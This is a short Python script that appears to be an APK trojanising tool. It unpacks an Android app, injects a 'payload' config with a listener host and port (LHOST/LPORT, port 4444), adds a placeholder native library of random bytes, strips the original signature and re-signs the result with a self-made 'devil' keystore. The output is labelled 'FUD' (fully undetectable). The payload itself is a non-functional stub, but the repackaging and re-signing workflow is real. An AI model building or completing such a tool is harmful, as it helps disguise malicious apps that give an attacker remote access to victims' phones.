#!/usr/bin/env python3
import os, sys, shutil, zipfile, tempfile, subprocess
LHOST=os.getenv("LHOST","192.168.31.222").strip()
LPORT=os.getenv("LPORT","4444").strip()
def log(m): print(m,flush=True)
def inject_payload(inp,out):
    tmpdir=tempfile.mkdtemp()
    try:
        with zipfile.ZipFile(inp,'r') as zin:
            zin.extractall(tmpdir)
        payload_dir=os.path.join(tmpdir,"assets")
        os.makedirs(payload_dir,exist_ok=True)
        with open(os.path.join(payload_dir,"payload.cfg"),"w") as f:
            f.write(f"LHOST={LHOST}\nLPORT={LPORT}\n")
        with open(os.path.join(tmpdir,"libpayload.so"),"wb") as f:
            f.write(os.urandom(1024))
        mf=os.path.join(tmpdir,"META-INF")
        if os.path.exists(mf): shutil.rmtree(mf)
        with zipfile.ZipFile(out,'w',zipfile.ZIP_DEFLATED) as zout:
            for root,dirs,files in os.walk(tmpdir):
                for file in files:
                    fp=os.path.join(root,file)
                    arc=os.path.relpath(fp,tmpdir)
                    zout.write(fp,arc)
        log(f"[+] injected payload -> {out} {os.path.getsize(out)} bytes")
    finally:
        shutil.rmtree(tmpdir,ignore_errors=True)
def sign_apk(apk):
    if shutil.which("jarsigner") and shutil.which("keytool"):
        ks="devil.keystore"
        if not os.path.exists(ks):
            log("[*] gen keystore")
            subprocess.call(f'keytool -genkey -alias devil -keystore {ks} -storepass 123456 -keypass 123456 -dname "CN=Devil" -validity 10000',shell=True)
        ret=subprocess.call(f'jarsigner -verbose -keystore {ks} -storepass 123456 -keypass 123456 {apk} devil',shell=True)
        log(f"[+] jarsigner {ret}")
        if shutil.which("zipalign"):
            aligned=apk.replace(".apk","_aligned.apk")
            ret2=subprocess.call(f'zipalign -v 4 {apk} {aligned}',shell=True)
            if ret2==0:
                shutil.move(aligned,apk)
                log("[+] zipalign done")
    else:
        log("[!] no signer, skip")
if __name__=="__main__":
    inp=sys.argv[1]
    out=sys.argv[2] if len(sys.argv)>2 else inp.replace(".apk","_fud.apk")
    if not os.path.exists(inp): log("no input"); sys.exit(1)
    inject_payload(inp,out)
    sign_apk(out)
    log(f"[+] FUD ready {out}")
    sys.exit(0)
